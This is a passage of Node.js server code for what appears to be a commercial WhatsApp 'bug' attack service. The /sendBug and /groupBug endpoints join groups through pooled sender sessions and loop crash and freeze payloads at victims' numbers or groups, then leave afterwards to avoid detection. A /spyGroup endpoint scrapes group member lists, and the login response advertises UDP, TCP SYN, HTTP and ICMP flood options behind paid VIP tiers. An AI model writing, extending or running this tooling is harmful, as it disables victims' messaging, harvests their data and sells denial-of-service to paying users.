                                    await s.groupAcceptInvite(inviteCode);
                                    sock = s;
                                    senderSource = name;
                                    joined = true;
                                    console.log(`[sendBugGroup] ✅ Joined with sender: ${name}`);
                                    await sleep(2000);
                                    break;
                                } catch (_) {}
                            }
                            
                            if (!joined) {
                                throw new Error('All senders restricted from joining groups');
                            }
                        } else {
                            throw joinErr;
                        }
                    }
                } catch (err) {
                    console.error(`[sendBugGroup] Join failed: ${err.message}`);
                    return;
                }
            } else {
                targetJid = group.includes("@g.us") ? group : group + "@g.us";
                joined = true;
            }

            if (!targetJid) {
                console.log(`[sendBugGroup] ❌ No target JID`);
                return;
            }

            console.log(`[sendBugGroup] Target: ${targetJid}, Bug: ${bugType}, Sender: ${senderSource}`);

            // ═══ STEP 2: KIRIM BUG ═══
            const loopCount = 30;
            let successCount = 0;
            
            for (let i = 0; i < loopCount; i++) {
                try {
                    switch (bugType) {
                        case "delayv1":
                            await QQSFreezeeChat(sock, targetJid);
                            await Omhcharddelay(sock, targetJid);
                            break;
                        case "delayhard":
                            await QQSFreezeeChat(sock, targetJid);
                            await QQSFreezeGroup(sock, targetJid);
                            break;
                        case "blank":
                            await QQSFreezeeChat(sock, targetJid);
                            await QQSFreezeGroup(sock, targetJid);
                            break;
                        case "force":
                            await XcrashXA(sock, targetJid);
                            await crashXCrB(sock, targetJid);
                            break;
                        case "fcno":
                            await BumXL(sock, targetJid);
                            await XcrasXU(sock, targetJid);
                            break;
                        case "forclose":
                            await QQSFreezeeChat(sock, targetJid);
                            await OmhcOld(sock, targetJid);
                            break;
                        case "crash":
                            await QQSFreezeeChat(sock, targetJid);
                            await VisibleOmhcSilence(sock, targetJid);
                            break;
                        case "freze":
                            await QQSFreezeeChat(sock, targetJid);
                            await FrezeChat(sock, targetJid);
                            break;
                        case "delay":
                            await NgelayV2(sock, targetJid);
                            await Omhcharddelay(sock, targetJid);
                            break;
                        case "BLANK":
                            await GbCrash(sock, targetJid);
                            await VisibleOmhcSilence(sock, targetJid);
                            break;
                        default:
                            console.warn(`[⚠️] Bug '${bugType}' tidak dikenal`);
                    }
                    successCount++;
                    await sleep(600);
                } catch (err) {
                    console.warn(`[sendBugGroup] Loop ${i+1} error: ${err.message}`);
                    if (err.message.includes('forbidden') || err.message.includes('403')) {
                        console.log(`[sendBugGroup] ❌ Forbidden, stop sending.`);
                        break;
                    }
                }
                
                if ((i + 1) % 5 === 0) {
                    console.log(`[sendBugGroup] Progress: ${i+1}/${loopCount}, success: ${successCount}`);
                }
            }

            console.log(`[✅ sendBugGroup] ${bugType} selesai, success: ${successCount}/${loopCount}`);

            // ═══ STEP 3: LEAVE GRUP ═══
            if (joined) {
                try {
                    await sleep(1500);
                    await sock.groupLeave(targetJid);
                    console.log(`[sendBugGroup] ✅ Left group: ${targetJid}`);
                } catch (leaveErr) {
                    console.warn(`[sendBugGroup] Leave error: ${leaveErr.message}`);
                }
            }

            // Log
            fs.appendFileSync('logUser.txt', `${user.username} BugGroup ${bugType} ${targetJid}\n`);

        } catch (err) {
            console.error(`[sendBugGroup] Error:`, err.message);
        }
    });
});

// GET /leaderboard — top sender users + top VIP users
app.get("/leaderboard", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });

    const db = loadDatabase();

    // Count senders per user (from permenmd folders)
    const senderCounts = {};
    try {
        const permenmdPath = path.join('permenmd');
        if (fs.existsSync(permenmdPath)) {
            for (const subfolder of fs.readdirSync(permenmdPath)) {
                const subPath = path.join(permenmdPath, subfolder);
                try {
                    if (!fs.statSync(subPath).isDirectory()) continue;
                    const jsonFiles = fs.readdirSync(subPath).filter(f => f.endsWith(".json"));
                    let active = 0;
                    for (const file of jsonFiles) {
                        const sessionName = path.basename(file, ".json");
                        if (activeConnections[sessionName]) active++;
                    }
                    if (active > 0) {
                        senderCounts[subfolder] = { total: jsonFiles.length, active };
                    }
                } catch (_) {}
            }
        }
    } catch (_) {}

    // Build sender leaderboard
    const senderLeaderboard = Object.entries(senderCounts)
        .map(([username, counts]) => {
            const user = db.find(u => u.username === username);
            return {
                username,
                role: user?.role || 'member',
                totalSenders: counts.total,
                activeSenders: counts.active,
            };
        })
        .sort((a, b) => b.activeSenders - a.activeSenders)
        .slice(0, 10);

    // Build VIP leaderboard (all VIP users sorted by expiry)
    const vipLeaderboard = db
        .filter(u => u.role === 'vip')
        .map(u => ({
            username: u.username,
            role: u.role,
            expiredDate: u.expiredDate,
            senderCount: senderCounts[u.username]?.active || 0,
        }))
        .sort((a, b) => new Date(b.expiredDate) - new Date(a.expiredDate))
        .slice(0, 10);

    // Stats
    const stats = {
        totalUsers: db.length,
        totalVIP: db.filter(u => u.role === 'vip').length,
        totalOwners: db.filter(u => u.role === 'owner').length,
        totalActiveSenders: Object.keys(activeConnections).length,
        totalSenderFolders: Object.keys(senderCounts).length,
    };

    res.json({ valid: true, senderLeaderboard, vipLeaderboard, stats });
});


app.get("/groupBug", async (req, res) => {
  const { key, link, bug } = req.query;
  console.log(`[📤 GROUP-BUG] key=${key}, bug=${bug}, link=${link}`);

  // ===== Validasi =====
  if (!link) return res.json({ valid: false, message: "Link grup wajib diisi" });
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link. Format: https://chat.whatsapp.com/xxxxxxxxxxxx" });
  const inviteCode = match[1];

  const validBugs = ["forclose", "crash", "blank", "freze", "delay", "BLANK"];
  const bugType = (bug || "forclose").toString();
  if (!validBugs.includes(bugType)) {
    return res.json({ valid: false, message: `Bug type tidak valid. Pilih: ${validBugs.join(", ")}` });
  }

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  // ===== Role check (VIP+ only) =====
  const role = user.role || 'member';
  const allowedRoles = ['vip', 'owner', 'founder', 'dev', 'high owner', 'high admin', 'moderator', 'seles', 'reseller'];
  if (!allowedRoles.includes(role.toLowerCase())) {
    return res.json({ valid: false, message: "Group bug hanya untuk VIP+. Upgrade ke VIP dulu." });
  }

  // ===== Cooldown (lebih lama dari contact bug, 5 menit per user) =====
  const groupCooldownMs = 5 * 60 * 1000; // 5 menit
  const now = Date.now();
  if (groupBugCooldowns[user.username] && now - groupBugCooldowns[user.username] < groupCooldownMs) {
    const wait = Math.ceil((groupCooldownMs - (now - groupBugCooldowns[user.username])) / 1000);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: wait,
      message: `Cooldown group bug aktif, tunggu ${wait} detik`
    });
  }

  // ===== Respond duluan =====
  groupBugCooldowns[user.username] = now;
  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    bug: bugType,
    role
  });

  // ===== Background: join grup, kirim bug, leave =====
  setImmediate(async () => {
    let sock = null;
    let groupJid = null;
    let joinedGroup = false;

    try {
      // Cari sender aktif (private dulu, fallback global)
      sock = checkActiveSessionInFolder(user.username, false);
      if (!sock) {
        const fallbackRoles = ['vip', 'owner', 'founder', 'dev', 'high owner', 'high admin', 'moderator', 'seles'];
        if (fallbackRoles.includes(role.toLowerCase())) {
          console.log(`[GROUP-BUG] ${user.username}: no private sender, fallback to global pool`);
          sock = checkActiveSessionInFolder(user.username, true);
        }
      }

      if (!sock) {
        console.warn(`[❌ GROUP-BUG] No sender available for ${user.username}`);
        return;
      }
      console.log(`[GROUP-BUG] Sender found for ${user.username}`);

      // Join grup
      try {
        groupJid = await sock.groupAcceptInvite(inviteCode);
        joinedGroup = true;
        console.log(`[GROUP-BUG] Joined group: ${groupJid}`);
        await sleep(2000);
      } catch (joinErr) {
        console.warn(`[⚠️ GROUP-BUG] Gagal join (mungkin udah di grup): ${joinErr.message}`);
        if (joinErr.data && joinErr.data.groupJid) {
          groupJid = joinErr.data.groupJid;
          joinedGroup = true;
        } else {
          const retrySock = checkActiveSessionInFolder(user.username, true);
          if (retrySock && retrySock !== sock) {
            try {
              groupJid = await retrySock.groupAcceptInvite(inviteCode);
              joinedGroup = true;
              sock = retrySock;
              await sleep(2000);
            } catch (retryErr) {
              console.warn(`[❌ GROUP-BUG] Retry join gagal: ${retryErr.message}`);
              return;
            }
          } else {
            return;
          }
        }
      }

      // Kirim bug payload
      const targetJid = groupJid;
      console.log(`[GROUP-BUG] Sending bug '${bugType}' to ${targetJid}...`);

      // Helper: swallow error biar gak break loop
      const safeCallG = async (fn, s, t, label) => {
        try { await fn(s, t); return true; }
        catch (e) {
          console.warn(`[GROUP-BUG] ${label} err (diskip): ${e.message}`);
          return false;
        }
      };
      // Helper: resolve sock fresh
      const resolveSockG = () => {
        // Group bug is VIP+ only (checked at top of endpoint).
        // Use global pool - search ALL folders.
        return checkActiveSessionInFolder(user.username, true);
      };

      let totalSent = 0, totalFail = 0;
      for (let i = 0; i < 100; i++) {
        let s = resolveSockG();
        if (!s) {
          for (let retryN = 1; retryN <= 3; retryN++) {
            console.warn(`[GROUP-BUG] Iterasi ${i+1}/100: no sender, retry ${retryN}/3 (wait 10s)...`);
            await sleep(10000);
            s = resolveSockG();
            if (s) break;
          }
          if (!s) {
            console.warn(`[GROUP-BUG] Iterasi ${i+1}/100: no sender after 3 retries, abort.`);
            break;
          }
        }

        let iterOk = true;
        switch (bugType) {
          case "forclose":
            // NEW FORCLOSE METHOD for groups — rotation + delays
            {
              const groupIdx = i % 3;
              if (groupIdx === 0) {
                if (!await safeCallG(QQSFreezeeChat, s, targetJid, 'QQSFreezeeChat')) iterOk = false;
                await sleep(500);
                if (!await safeCallG(QQSFreezeGroup, s, targetJid, 'QQSFreezeGroup')) iterOk = false;
                await sleep(500);
                if (!await safeCallG(LockGb, s, targetJid, 'LockGb')) iterOk = false;
                await sleep(500);
                if (!await safeCallG(mbut, s, targetJid, 'mbut')) iterOk = false;
              } else if (groupIdx === 1) {
                if (!await safeCallG(QQSFreezeeChat, s, targetJid, 'QQSFreezeeChat')) iterOk = false;
                await sleep(500);
                if (!await safeCallG(LockGb, s, targetJid, 'LockGb')) iterOk = false;
                await sleep(500);
                if (!await safeCallG(mbut, s, targetJid, 'mbut')) iterOk = false;
                await sleep(500);
                if (!await safeCallG(QQSFreezeGroup, s, targetJid, 'QQSFreezeGroup')) iterOk = false;
              } else {
                if (!await safeCallG(QQSFreezeGroup, s, targetJid, 'QQSFreezeGroup')) iterOk = false;
                await sleep(500);
                if (!await safeCallG(mbut, s, targetJid, 'mbut')) iterOk = false;
                await sleep(500);
                if (!await safeCallG(LockGb, s, targetJid, 'LockGb')) iterOk = false;
                await sleep(500);
                if (!await safeCallG(QQSFreezeeChat, s, targetJid, 'QQSFreezeeChat')) iterOk = false;
              }
            }
            break;
          case "crash":
            if (!await safeCallG(QQSFreezeeChat, s, targetJid, 'QQSFreezeeChat')) iterOk = false;
            if (!await safeCallG(QQSFreezeGroup, s, targetJid, 'QQSFreezeGroup')) iterOk = false;
            if (!await safeCallG(LockGb, s, targetJid, 'LockGb')) iterOk = false;
            if (!await safeCallG(mbut, s, targetJid, 'mbut')) iterOk = false;
            break;
          case "blank":
            if (!await safeCallG(QQSFreezeeChat, s, targetJid, 'QQSFreezeeChat')) iterOk = false;
            if (!await safeCallG(OmhcOld, s, targetJid, 'OmhcOld')) iterOk = false;
            if (!await safeCallG(VisibleOmhcSilence, s, targetJid, 'VisibleOmhcSilence')) iterOk = false;
            if (!await safeCallG(mbut, s, targetJid, 'mbut')) iterOk = false;
            break;
          case "freze":
            if (!await safeCallG(QQSFreezeeChat, s, targetJid, 'QQSFreezeeChat')) iterOk = false;
            if (!await safeCallG(mbut, s, targetJid, 'mbut')) iterOk = false;
            if (!await safeCallG(VisibleOmhcSilence, s, targetJid, 'VisibleOmhcSilence')) iterOk = false;
            if (!await safeCallG(NgelayV2, s, targetJid, 'NgelayV2')) iterOk = false;
            break;
          case "delay":
            if (!await safeCallG(NgelayV2, s, targetJid, 'NgelayV2')) iterOk = false;
            if (!await safeCallG(Omhcharddelay, s, targetJid, 'Omhcharddelay')) iterOk = false;
            if (!await safeCallG(VisibleOmhcSilence, s, targetJid, 'VisibleOmhcSilence')) iterOk = false;
            break;
          case "BLANK":
            if (!await safeCallG(GbCrash, s, targetJid, 'GbCrash')) iterOk = false;
            if (!await safeCallG(VisibleOmhcSilence, s, targetJid, 'VisibleOmhcSilence')) iterOk = false;
            if (!await safeCallG(NgelayV2, s, targetJid, 'NgelayV2')) iterOk = false;
            break;
        }

        if (iterOk) totalSent++; else totalFail++;
        if ((i + 1) % 10 === 0 || i === 0) {
          console.log(`[GROUP-BUG] Progress: ${i+1}/100 | sent=${totalSent} fail=${totalFail}`);
        }
        await sleep(1000);
      }

      console.log(`[✅ GROUP-BUG] Bug '${bugType}' ke grup ${targetJid} selesai. sent=${totalSent} fail=${totalFail} dari 100.`);

      // Leave grup setelah selesai (biar gak ketahuan)
      try {
        await sleep(1000);
        const leaveSock = resolveSockG();
        if (leaveSock) await leaveSock.groupLeave(groupJid);
        console.log(`[GROUP-BUG] Left group: ${groupJid}`);
      } catch (leaveErr) {
        console.warn(`[GROUP-BUG] Gagal leave grup: ${leaveErr.message}`);
      }

      // Log
      fs.appendFileSync('logUser.txt', `${user.username} GroupBug ${bugType} ${groupJid}
`);

    } catch (err) {
      console.error(`[❌ GROUP-BUG] Fatal error: ${err.message}`);
      if (joinedGroup && sock && groupJid) {
        try { await sock.groupLeave(groupJid); } catch (_) {}
      }
    }
  });
});

// Alias
app.get('/api/whatsapp/groupBug', (req, res) => {
  req.url = '/groupBug?' + (req.url.split('?')[1] || '');
  app.handle(req, res);
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

  const news = [
  {
    image: "https://j.top4top.io/p_3843d57a91.jpg",
    title: "YakuzaXsilence",
    desc: "CREDIT BY @kiuchan11"
  },
  {
    image: "https://j.top4top.io/p_3843d57a91.jpg",
    title: "YakuzaXsilence",
    desc: "CREDIT BY @kiuchan11"
  },
  {
    image: "https://j.top4top.io/p_3843d57a91.jpg",
    title: "YakuzaXSilence",
    desc: "CREDIT BY @kiuchan11"
    }
  ];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const userIdx = db.findIndex(u => u.username === username && u.password === password);
const user = db[userIdx];

if (!user) return res.json({ valid: false });

// Auto-generate pairId kalau belum ada
if (!user.pairId) {
  user.pairId = genPairId();
  db[userIdx] = user;
  saveDatabase(db);
}

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

const ddosList = [
  { ddos_id: "udp", ddos_name: "UDP Flood" },
  { ddos_id: "tcp", ddos_name: "TCP SYN Flood" },
  { ddos_id: "http", ddos_name: "HTTP Flood" },
  { ddos_id: "icmp", ddos_name: "ICMP Flood" },
];

const payloadList = [
  { payload_id: "standard", payload_name: "Standard" },
  { payload_id: "amplified", payload_name: "Amplified" },
];

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  role: user.role || "member",
  pairId: user.pairId || null,
  listBug: bugs,
  listDDoS: ddosList,
  listPayload: payloadList,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pairId: user.pairId || null,
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

// GET /meByKey?key=...
// Lightweight endpoint buat dapetin role + expiredDate cuma pake sessionKey.
// Gak butuh username/password/androidId (dipake pas role di-refresh di
// dashboard / VIP page setelah owner approve VIP request).
app.get("/meByKey", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false, message: 'User not found' });

  return res.json({
    valid: true,
    username: user.username,
    role: user.role || 'member',
    expiredDate: user.expiredDate,
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// ===== Definisi Cooldown per Role (tambahkan di bagian atas) =====
const roleCooldowns = {
  member: 70,
  reseller: 40,
  admin: 30,
  owner: 20,
  vip: 10,
  svip: 5,
  vvip: 5,
  exec: 5,
  staf: 5,
  developer: 0,
  creator: 0,
  "full up": 10
};

// ===== Endpoint /sendBug yang SUDAH DIGANTI =====
app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤 BUG] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  // ═══ COOLDOWN CHECK ═══
  const role = (user.role || "member").toLowerCase();
  const cooldownSeconds = roleCooldowns[role] ?? 10;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (cooldownSeconds > 0 && diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  // Catat aktivitas ke logUser.txt (ganti saveUserLog yang tidak ada)
  fs.appendFileSync('logUser.txt', 
    `${user.username} | Bug: ${bug.toUpperCase()} | Target: ${target} | Mode: ${senderMode} | Role: ${role}\n`
  );

  setImmediate(async () => {
    let sock = null;

    // ===== PILIH SENDER SESUAI MODE & ROLE =====
    if (senderMode === 'global') {
      const allowedGlobalRoles = ['vip', 'svip', 'vvip', 'exec', 'staf', 'owner', 'founder', 'dev', 'developer', 'creator', 'high owner', 'high admin', 'moderator', 'seles'];
      if (!allowedGlobalRoles.includes(role)) {
        console.warn(`[❌] Global sender tidak diizinkan untuk role: ${role}`);
        return;
      }
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        console.warn(`[❌] Global: tidak ada koneksi aktif.`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);

    } else if (['vip', 'svip', 'vvip', 'exec', 'staf', 'developer', 'creator', 'owner', 'founder', 'dev'].includes(role)) {
      // VIP+ bisa pakai pool global + sesi pribadi
      sock = checkActiveSessionInFolder(user.username, true); // true = cari semua folder
      if (!sock) {
        console.warn(`[❌] VIP: tidak ada koneksi aktif.`);
        return;
      }
      console.log(`[👑] VIP/GLOBAL pool digunakan`);

    } else {
      // Member biasa: hanya sesi pribadi
      sock = checkActiveSessionInFolder(user.username, false);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada koneksi untuk ${user.username}. Tambahkan sesi dulu atau upgrade ke VIP.`);
        return;
      }
      console.log(`[🔒] Private sender: ${user.username}`);
    }

    // ===== HELPER: safe call (swallow error biar gak break loop) =====
    const safeCall = async (fn, s, t, label) => {
      try { await fn(s, t); return true; }
      catch (e) { console.warn(`[BUG] ${label} err: ${e.message}`); return false; }
    };

    // ===== FUNGSI KIRIM BUG DENGAN RETRY =====
    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        // Cari nama sesi dari socket
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        // ===== PROSES TARGET (GRUP ATAU PRIBADI) =====
        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite code: ${inviteCode}`);
          let groupInfo;
          try { 
            groupInfo = await sock.groupGetInviteInfo(inviteCode); 
          } catch (e) { 
            throw new Error("Link grup tidak valid / sudah kadaluarsa"); 
          }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Berhasil join grup: ${targetJid}`);
          } catch { 
            console.log(`[⚠️] Sudah menjadi anggota grup`); 
          }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] Target JID: ${targetJid}`);

        // ===== PILIH JENIS BUG =====
        switch (bug) {
          case "forclose":
            for (let i = 0; i < 100; i++) {
              await safeCall(ange, sock, targetJid, "ange");
              await safeCall(TesterFc, sock, targetJid, "TesterFc");
              await safeCall(QQSFreezeeChat, sock, targetJid, "QQSFreezeeChat");
              await safeCall(ange, sock, targetJid, "ange");
              await safeCall(ConTolX, sock, targetJid, "ConTolX");
              await safeCall(BUMxC, sock, targetJid, "BUMxC");
              await safeCall(XcrashXA, sock, targetJid, "XcrashXA");
              await safeCall(crashXCrB, sock, targetJid, "crashXCrB");
              await safeCall(DelayXxAh, sock, targetJid, "DelayXxAh");
              await safeCall(FrezeIMgX, sock, targetJid, "FrezeIMgX");
              await safeCall(BumXL, sock, targetJid, "BumXL");
              await safeCall(XcrasXU, sock, targetJid, "XcrasXU");
              await safeCall(ContacXA, sock, targetJid, "ContacXA");
              await safeCall(XcrashXXZ, sock, targetJid, "XcrashXXZ");
            //  await safeCall(OmhcOld, sock, targetJid, "OmhcOld");
            //  await safeCall(VisibleOmhcSilence, sock, targetJid, "VisibleOmhcSilence");             
             // await safeCall(mbut, sock, targetJid, "mbut");
              await sleep(1000);
            }
            break;

          case "crash":
          //case "blank":
            for (let i = 0; i < 30; i++) {
              await safeCall(QQSFreezeeChat, sock, targetJid, "QQSFreezeeChat");
             // await safeCall(OmhcOld, sock, targetJid, "OmhcOld");
              await safeCall(VisibleOmhcSilence, sock, targetJid, "VisibleOmhcSilence");
              await sleep(1000);
              await safeCall(mbut, sock, targetJid, "mbut");
              await sleep(1000);
            }
            break;

          case "freze":
            for (let i = 0; i < 35; i++) {
              await safeCall(QQSFreezeeChat, sock, targetJid, "QQSFreezeeChat");
              await safeCall(mbut, sock, targetJid, "mbut");
              await sleep(1000);
              await safeCall(VisibleOmhcSilence, sock, targetJid, "VisibleOmhcSilence");
             // await safeCall(NgelayV2, sock, targetJid, "NgelayV2");
              await sleep(1000);
            }
            break;

          case "delay":
            for (let i = 0; i < 100; i++) {
              await safeCall(NgelayV2, sock, targetJid, "NgelayV2");
              await sleep(1000);
              await safeCall(Omhcharddelay, sock, targetJid, "Omhcharddelay");
              await sleep(1000);
              await safeCall(VisibleOmhcSilence, sock, targetJid, "VisibleOmhcSilence");
             // await safeCall(dongo, sock, targetJid, "dongo");
              await sleep(1000);
            }
            break;

          case "blank":
            for (let i = 0; i < 23; i++) {
              await safeCall(GbCrash, sock, targetJid, "GbCrash");
            //  await safeCall(VisibleOmhcSilence, sock, targetJid, "VisibleOmhcSilence");
              await sleep(1000);
              await safeCall(NgelayV2, sock, targetJid, "NgelayV2");
            //  await safeCall(k, sock, targetJid, "k");
              await sleep(1500);
            }
            break;

          default:
            console.warn(`[⚠️] Jenis bug '${bug}' tidak dikenal`);
        }

        console.log(`[✅] Bug '${bug}' berhasil dikirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] Error: ${err.message}`);
        
        // Hapus sesi jika koneksi terputus
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑] Sesi ${sessionName} dihapus karena terputus`);
        }

        // Coba ulang kirim dengan sesi lain
        if (!retry) {
          const canUseGlobal = ['vip', 'svip', 'vvip', 'exec', 'staf', 'owner', 'founder', 'dev', 'developer', 'creator'].includes(role);
          let retrySock = null;

          if (canUseGlobal) {
            retrySock = checkActiveSessionInFolder(user.username, true);
          } else {
            retrySock = checkActiveSessionInFolder(user.username, false);
          }

          if (retrySock) {
            console.log(`[🔁] Mencoba ulang dengan sesi lain...`);
            return await attemptSend(retrySock, true);
          }
        }

        console.warn(`[❌] Gagal mengirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});


function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// Ambil SEMUA sesi aktif di seluruh folder permenmd/* — dipakai sebagai
// "global sender pool" untuk user VIP. Setiap entry dikasih tag `owner`
// (nama folder = username pemilik sender) supaya UI bisa nunjukin info.
function getGlobalActiveCreds(excludeUsername = null) {
  const result = [];
  const permenmdPath = path.join('permenmd');
  if (!fs.existsSync(permenmdPath)) return result;

